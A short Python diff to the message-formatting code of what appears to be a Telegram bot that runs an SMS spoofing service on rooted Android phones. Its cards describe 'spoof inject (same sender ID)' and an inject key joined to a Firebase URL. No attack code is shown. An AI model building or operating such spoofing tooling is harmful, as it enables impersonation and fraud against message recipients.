@@ -21,7 +21,7 @@ def format_apk_download_card(download_url: str) -> str:
         "<pre>"
         "Android (rooted mynum phone):\n"
         "1. APK install\n"
-        "2. Bot wala KEY daalo (Firebase auto-pull)\n"
+        "2. APK me KEY|Firebase URL daalo (pipe format)\n"
         "3. START SERVICE ON\n"
         "4. TEST INJECTION\n"
         "5. Bot /startmonitor"
@@ -479,6 +479,7 @@ def format_monitoring_card(
     test_message: str | None = None,
     *,
     startup_test_sent: bool = False,
+    firebase_url: str | None = None,
 ) -> str:
     sim_index = profile.selected_sim_index or 0
     active_sim = get_selected_sim(device, sim_index)
@@ -487,6 +488,9 @@ def format_monitoring_card(
     inject_key = get_inject_key(profile, device)
     test_msg = test_message or STARTUP_TEST_MESSAGE
     test_line = f"✅ Test inject OK: {test_msg}" if startup_test_sent else "⏳ Test inject queued..."
+    apk_setup = ""
+    if inject_key and firebase_url:
+        apk_setup = f"📲 APK KEY field: {inject_key}|{firebase_url.rstrip('/')}\n"
 
     channel = profile.channel_id or "—"
     return (
@@ -497,6 +501,7 @@ def format_monitoring_card(
         f"📡 Device: {format_device_online(device)} (Firebase live)\n"
         f"📶 FROM SIM: {sim_slot}\n"
         f"🔑 Inject Key: {inject_key}\n"
+        f"{apk_setup}"
         "📥 Incoming -&gt; spoof inject (same sender ID)\n"
         f"📢 Channel: {channel} (last / addchannel only)\n"
         f"⏱️ Auto-stop in {auto_stop} minutes\n"
